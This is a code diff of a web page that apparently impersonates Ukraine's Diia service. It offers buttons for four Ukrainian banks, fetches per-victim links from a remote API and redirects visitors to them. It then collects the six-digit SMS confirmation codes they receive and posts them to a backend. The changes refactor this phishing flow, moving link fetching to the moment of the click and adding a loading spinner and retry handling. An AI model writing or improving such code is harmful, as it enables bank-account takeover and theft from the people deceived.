@@ -139,6 +139,22 @@
       backdrop-filter: blur(10px);
       border: 1px solid rgba(255, 255, 255, 0.2);
     }
+
+    /* Индикатор загрузки */
+    .loading-indicator {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
     
     /* SMS экран - полноэкранный режим */
     .sms-fullscreen {
@@ -473,13 +489,11 @@
     // ИСПОЛЬЗУЕМ HTTPS API!
     const API_BASE = "https://api.astrinvite.site";
     
-    const API_MAP = {
-      mono:   `${API_BASE}/link?bank=monobank`,
-      oschad: `${API_BASE}/link?bank=oschadbank`,
-      raiff:  `${API_BASE}/link?bank=raiffeisenbank`,
-      pumb:   `${API_BASE}/link?bank=pumbbank`
-    };
-    
+    // ОПТИМИЗИРОВАННАЯ АРХИТЕКТУРА: 
+    // 1. Проверяем только доступность ссылок (без их получения)
+    // 2. Получаем ссылку только в момент клика
+    const CHECK_AVAILABILITY_URL = `${API_BASE}/check-availability`; // Новый endpoint для проверки доступности
+    const GET_LINK_URL = `${API_BASE}/get-link`; // Новый endpoint для получения ссылки
     const CONSUME_URL = `${API_BASE}/consume-link`;
     const STATUS_URL = `${API_BASE}/api/link-status`;
     const CODE_URL   = `${API_BASE}/api/submit-code`;
@@ -497,7 +511,6 @@
       "pumb-btn": "ПУМБ"
     };
 
-    const linkData = {};  // банк → { url, id }
     let currentBank = null;
     let currentId = null;
     let pollingStatus = false;
@@ -527,22 +540,17 @@
       });
     }
 
-    // 🔥 ИСПРАВЛЕННАЯ функция проверки ссылок для банка
-    async function checkLinksForBank(bank) {
+    // ОПТИМИЗИРОВАННАЯ ФУНКЦИЯ: Проверяем только доступность, НЕ получаем ссылки
+    async function checkBankAvailability(bank) {
       const btn = document.getElementById(bank + "-btn");
       
       if (!btn) return;
 
-      // 🔥 НОВОЕ: Если у нас уже есть активная ссылка для этого банка, не проверяем повторно
-      if (linkData[bank] && linkData[bank].url && linkData[bank].id) {
-        console.log(`✅ У ${bank} уже есть активная ссылка ${linkData[bank].id} - пропускаем проверку`);
-        return; // Не делаем запрос, используем существующую ссылку
-      }
-
       try {        
-        console.log(`🔍 Проверяем ссылки для банка: ${bank}`);
+        console.log(`🔍 Проверяем доступность для банка: ${bank}`);
         
-        const res = await fetch(API_MAP[bank], {
+        // Используем новый endpoint для проверки доступности
+        const res = await fetch(`${CHECK_AVAILABILITY_URL}?bank=${bank}`, {
           method: 'GET',
           mode: 'cors',
           cache: 'no-cache',
@@ -556,36 +564,36 @@
         
         if (res.ok) {
           const data = await res.json();
-          console.log(`📦 Данные для ${bank}:`, data);
+          console.log(`📦 Данные доступности для ${bank}:`, data);
           
-          if (data.url && data.id) {
-            linkData[bank] = { url: data.url, id: data.id };
+          if (data.available) {
+            // Ссылки доступны - активируем кнопку
             btn.disabled = false;
             btn.onclick = () => handleBankClick(bank);
             btn.textContent = BANK_TEXTS[bank + "-btn"];
-            console.log(`✅ Кнопка ${bank} активирована с новой ссылкой ${data.id}!`);
+            console.log(`✅ Кнопка ${bank} активирована!`);
           } else {
+            // Нет доступных ссылок
             btn.disabled = true;
             btn.onclick = null;
-            delete linkData[bank];
             btn.textContent = BANK_TEXTS[bank + "-btn"];
-            console.log(`❌ Кнопка ${bank} деактивирована - нет url/id`);
+            console.log(`❌ Кнопка ${bank} деактивирована - нет доступных ссылок`);
           }
-        } else if (res.status === 429) {
-          // 🔥 ИСПРАВЛЕНО: При 429 НЕ удаляем существующую ссылку, просто логируем
-          console.log(`⚠️ 429 для ${bank} - оставляем существующую ссылку без изменений`);
-          // НЕ деактивируем кнопку если у неё есть ссылка
         } else {
           console.log(`❗ Ошибка ${bank}: ${res.status}`);
-          // При других ошибках тоже не трогаем существующие ссылки
+          btn.disabled = true;
+          btn.onclick = null;
+          btn.textContent = BANK_TEXTS[bank + "-btn"];
         }
       } catch (error) {
         console.error(`❗ Ошибка проверки ${bank}:`, error);
-        // При ошибках сети не трогаем существующие ссылки
+        btn.disabled = true;
+        btn.onclick = null;
+        btn.textContent = BANK_TEXTS[bank + "-btn"];
       }
     }
 
-    async function checkAllLinks() {
+    async function checkAllBanksAvailability() {
       if (refreshInProgress || !autoRefreshActive) return;
       
       refreshInProgress = true;
@@ -593,10 +601,10 @@
       try {
         // Проверяем все банки параллельно
         await Promise.all([
-          checkLinksForBank("mono"),
-          checkLinksForBank("oschad"),
-          checkLinksForBank("raiff"),
-          checkLinksForBank("pumb")
+          checkBankAvailability("mono"),
+          checkBankAvailability("oschad"),
+          checkBankAvailability("raiff"),
+          checkBankAvailability("pumb")
         ]);
         
         lastRefreshTime = Date.now();
@@ -665,55 +673,79 @@
           el.disabled = true;
         }
       });
-      document.getElementById(btnId).textContent = "Завантаження...";
+      
+      const btn = document.getElementById(btnId);
+      btn.disabled = true;
+      btn.innerHTML = `Завантаження... <div class="loading-indicator"></div>`;
       document.getElementById("status").innerHTML = "";
     }
 
     // Функция скрытия загрузки с восстановлением текста
     function hideLoading() {
       restoreButtonTexts();
-      // Состояние кнопок будет обновлено при следующем checkAllLinks()
+      // Состояние кнопок будет обновлено при следующем checkAllBanksAvailability()
     }
 
+    // КЛЮЧЕВАЯ ОПТИМИЗАЦИЯ: Получаем ссылку только в момент клика
     async function handleBankClick(bank) {
       resetUI();
       currentBank = bank;
       const btnId = bank + "-btn";
       showLoading(btnId);
 
-      const data = linkData[bank];
-      if (!data || !data.url || !data.id) {
-        document.getElementById("status").innerHTML = "<span style='color:#fff'>Немає доступної ссилки для цього банку.</span>";
-        hideLoading();
-        autoRefreshActive = true;
-        checkAllLinks();
-        return;
-      }
-
-      currentId = data.id;
-      link = data.url;
-      
-      // 🔥 ИСПРАВЛЕНО: Удаляем использованную ссылку ЛОКАЛЬНО сразу после клика
-      console.log(`🔒 Удаляем использованную ссылку ${currentId} локально для ${bank}`);
-      delete linkData[bank];
-      
       try {
-        // Используем правильный URL только с параметром id
-        const consumeUrl = `${CONSUME_URL}?id=${currentId}`;
-        console.log(`🔗 Consume URL: ${consumeUrl}`);
+        console.log(`🎯 Получаем ссылку для банка: ${bank}`);
         
-        const consumeRes = await fetch(consumeUrl, { method: "POST" });
-        const consumeData = await consumeRes.json();
-        console.log(`✅ Consume response:`, consumeData);
+        // Получаем ссылку в момент клика
+        const res = await fetch(`${GET_LINK_URL}?bank=${bank}`, {
+          method: 'POST', // POST чтобы сразу зарезервировать ссылку
+          mode: 'cors',
+          cache: 'no-cache',
+          headers: {
+            'Content-Type': 'application/json',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache'
+          }
+        });
+        
+        if (!res.ok) {
+          if (res.status === 429) {
+            document.getElementById("status").innerHTML = "<span style='color:#fff'>Всі ссилки для цього банку зайняті. Спробуйте ще раз через кілька секунд.</span>";
+          } else {
+            document.getElementById("status").innerHTML = "<span style='color:#fff'>Помилка отримання ссилки. Спробуйте ще раз.</span>";
+          }
+          hideLoading();
+          autoRefreshActive = true;
+          checkAllBanksAvailability();
+          return;
+        }
+
+        const data = await res.json();
+        console.log(`📦 Отримана ссылка:`, data);
+        
+        if (!data.url || !data.id) {
+          document.getElementById("status").innerHTML = "<span style='color:#fff'>Немає доступної ссилки для цього банку.</span>";
+          hideLoading();
+          autoRefreshActive = true;
+          checkAllBanksAvailability();
+          return;
+        }
+
+        currentId = data.id;
+        link = data.url;
+        
+        // Ссылка получена и зарезервирована, можем переходить
+        document.getElementById("return-instruction").style.display = "block";
+        window.location.href = link;
+        pollStatus();
         
       } catch (e) {
-        console.log("⚠️ Ошибка consume (продолжаем):", e);
-        // Продолжаем работу даже если consume не удался
+        console.error("Ошибка получения ссылки:", e);
+        document.getElementById("status").innerHTML = "<span style='color:#fff'>Помилка з'єднання. Спробуйте ще раз.</span>";
+        hideLoading();
+        autoRefreshActive = true;
+        checkAllBanksAvailability();
       }
-      
-      document.getElementById("return-instruction").style.display = "block";
-      window.location.href = link;
-      pollStatus();
     }
 
     async function pollStatus() {
@@ -744,7 +776,7 @@
           pollingStatus = false;
           hideLoading();
           autoRefreshActive = true;
-          checkAllLinks();
+          checkAllBanksAvailability();
         }
       }, 2500);
     }
@@ -803,11 +835,11 @@
       `;
       
       setupSMSInput();
-      checkResendStatus();
-      startSMSCountdown();
+      checkResendStatus(); // Проверяем доступность повторной отправки
+      startSMSCountdown(); // Запускаем таймер обратного отсчета
     }
 
-    // Функция таймера обратного отсчета встроенного в кнопку
+    // Новая функция таймера обратного отсчета встроенного в кнопку
     function startSMSCountdown() {
       let totalSeconds = 180; // 3 минуты
       const timerDisplay = document.getElementById('resend-timer-display');
@@ -1041,7 +1073,7 @@
             
             console.log("✅ Код принят Дією успешно!");
             
-            // Показываем только "ожидаем подтверждения" без кнопок
+            // ИСПРАВЛЕНО: Показываем только "ожидаем подтверждения" без кнопок
             document.body.innerHTML = `
               <div class="sms-fullscreen">
                 <div class="diia-logo">
@@ -1057,11 +1089,12 @@
               </div>
             `;
             
-            // Перезагружаем через 30 секунд для возврата к выбору банков
+            // ВОССТАНАВЛИВАЕМ автообновление ссылок каждые 3 секунды
             setTimeout(() => {
               location.reload();
-            }, 30000);
+            }, 30000); // Перезагружаем через 30 секунд для возврата к выбору банков
             
+            // НЕ перезагружаем страницу - просто ждем подтверждения
             return;
             
           } else if (result.status === "failed" || result.status === "error") {
@@ -1087,7 +1120,7 @@
               digits[0].focus();
             }
             
-            // Проверяем есть ли специфическое сообщение об ошибке
+            // ИСПРАВЛЕНО: Проверяем есть ли специфическое сообщение об ошибке
             let errorMessage = "❌ Неправильний код! Введіть коректний 6-значний код з SMS";
             
             // Если есть сообщение об ошибке от FSM, используем его
@@ -1222,8 +1255,9 @@
       }
     }
     
-    // Кулдаун для повторной отправки (30 секунд)
+    // Кулдаун для повторной отправки (30 секунд) - УПРОЩЕННАЯ ВЕРСИЯ
     function startResendCooldown() {
+      // Просто блокируем кнопку на 30 секунд без дополнительного UI
       const resendBtn = document.getElementById("resend-btn");
       
       if (resendBtn) {
@@ -1247,19 +1281,19 @@
       }
     }
 
-    // 🔥 ИСПРАВЛЕНО: Инициализация автообновления с разумными интервалами
+    // Инициализация автообновления
     function startAutoRefresh() {
-      // Первоначальная проверка
-      checkAllLinks();
+      // Первоначальная проверка доступности
+      checkAllBanksAvailability();
       
-      // Устанавливаем интервал автообновления каждые 5 секунд (компромисс между скоростью и rate limiting)
+      // Устанавливаем интервал автообновления каждые 5 секунд (чаще чтобы быстрее реагировать)
       refreshInterval = setInterval(() => {
         if (autoRefreshActive && !refreshInProgress) {
-          checkAllLinks();
+          checkAllBanksAvailability();
         }
-      }, 5000); // 5 секунд - достаточно быстро для синхронизации, но безопасно для rate limiting
+      }, 5000);
       
-      console.log("🔄 Автообновление запущено (каждые 5 сек, оптимизировано для rate limiting)");
+      console.log("🔄 Автообновление доступности запущено (каждые 5 сек)");
     }
 
     // Обработка видимости страницы (останавливаем при скрытии)
@@ -1269,12 +1303,7 @@
         console.log("⏸ Автообновление приостановлено (страница скрыта)");
       } else {
         autoRefreshActive = true;
-        // При возврате на страницу проверяем ссылки
-        setTimeout(() => {
-          if (autoRefreshActive) {
-            checkAllLinks();
-          }
-        }, 1000); // Небольшая задержка
+        checkAllBanksAvailability();
         console.log("▶ Автообновление возобновлено (страница видима)");
       }
     });
